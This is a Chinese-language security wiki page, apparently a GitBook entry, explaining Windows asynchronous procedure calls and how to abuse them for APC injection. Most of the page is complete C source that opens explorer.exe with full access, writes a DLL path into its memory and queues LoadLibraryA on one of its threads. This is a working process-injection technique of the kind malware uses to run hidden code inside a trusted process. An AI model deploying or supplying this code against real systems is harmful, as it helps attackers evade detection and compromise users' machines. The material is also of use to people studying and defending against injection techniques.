---
description: APC注入
---

# APC Injection

## APC简介

> 一个_异步过程调用_（APC）的是，在一个特定的线程的上下文中以异步方式执行的功能。当APC排队到线程中时，系统会发出软件中断。下次调度线程时，它将运行APC功能。系统生成的APC称为_内核模式APC_。由应用程序生成的APC称为_用户模式APC_。线程必须处于可警报状态才能运行用户模式APC。

> 每个线程都有自己的APC队列。应用程序通过调用**QueueUserAPC**函数将APC排队到线程中。调用线程在对**QueueUserAPC**的调用中指定APC函数的地址。APC的排队是对线程调用APC函数的请求。

> 当用户模式APC排队时，除非它处于警报状态，否则不会将其排队的线程定向到调用APC函数。当线程调用**SleepEx**，**SignalObjectAndWait**，**MsgWaitForMultipleObjectsEx**，**WaitForMultipleObjectsEx**或**WaitForSingleObjectEx**函数时，它将进入可警告状态。如果在APC排队之前满足了等待，线程将不再处于可警告的等待状态，因此将不执行APC功能。但是，APC仍在排队，因此当线程调用另一个可警告的等待函数时，将执行APC函数。**ReadFileEx**，**SetWaitableTimer**，**SetWaitableTimerEx**，和**WriteFileEx**功能使用APC作为完成通知回调机制来实现。

简单的说，由于在线程执行过程中，其他线程无法干预当前执行线程\(占用cpu\)，如果需要干预当前执行线程的操作，就需要有一种让线程自身去调用的机制，windows实现了一种称之为APC的技术，这种技术可以通过插入队列\(执行信息\)让线程在一定条件下自己去调用，这样就实现了异步操作。

> 线程是不能被“杀掉”、“挂起”、“恢复”的,线程在执行的时候自己占据着CPU,别人怎么可能控制它呢?

> 举个极端的例子:如果不调用API,屏蔽中断,并保证代码不出现异常,线程将永久占用CPU,何谈控制呢?所以说线程如果想“死",一定是自己执行代码把自己杀死,不存在“他杀”这种情况!

> 那如果想改变一个线程的行为该怎么办呢?

> 可以给他提供一个函数,让它自己去调用,这个函数就是APC \(Asyncroneus Procedure Call\),即异步过程调用。

## 注入流程

1. 从进程名确定PID
2. 从PID确定TID
3. 写入必要代码
4. 插入APC队列

## 代码实现

```text
#include<Windows.h>
#include<stdio.h>
#include <Tlhelp32.h>

DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof pe;

	if (Process32First(hSnapshot, &pe))
	{
		do {
			if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
			{
				CloseHandle(hSnapshot);
				return pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);
	return 0;
}


BOOL GetAllThreadIdByProcessId(DWORD dwProcessId)
{

	DWORD dwBufferLength = 1000;
	THREADENTRY32 te32 = { 0 };
	HANDLE hSnapshot = NULL;
	BOOL bRet = TRUE;


	// 获取线程快照
	::RtlZeroMemory(&te32, sizeof(te32));
	te32.dwSize = sizeof(te32);
	hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	// 获取第一条线程快照信息
	bRet = ::Thread32First(hSnapshot, &te32);
	while (bRet)
	{
		// 获取进程对应的线程ID
		if (te32.th32OwnerProcessID == dwProcessId)
		{
			return te32.th32ThreadID;
		}

		// 遍历下一个线程快照信息
		bRet = ::Thread32Next(hSnapshot, &te32);
	}
	return 0;
}

int main() {
	FARPROC pLoadLibrary = NULL;
	HANDLE hThread = NULL;
	HANDLE hProcess = 0;
	DWORD Threadid = 0;
	DWORD ProcessId = 0;
	BYTE DllName[] = "C:\\Users\\Black Sheep\\source\\repos\\ApcInject\\x64\\Debug\\TestDll.dll";
	LPVOID AllocAddr = NULL;

	ProcessId = GetProcessIdByName(L"explorer.exe");
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessId);
	pLoadLibrary = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	AllocAddr = VirtualAllocEx(hProcess, 0, sizeof(DllName) + 1, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hProcess, AllocAddr, DllName, sizeof(DllName) + 1, 0);
	Threadid = GetAllThreadIdByProcessId(ProcessId);
	hThread = OpenThread(THREAD_ALL_ACCESS, 0, Threadid);
	QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)AllocAddr);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return 0;

}
```

## LINKS

{% embed url="https://github.com/idiotc4t/ApcInject" %}

{% embed url="https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls" %}



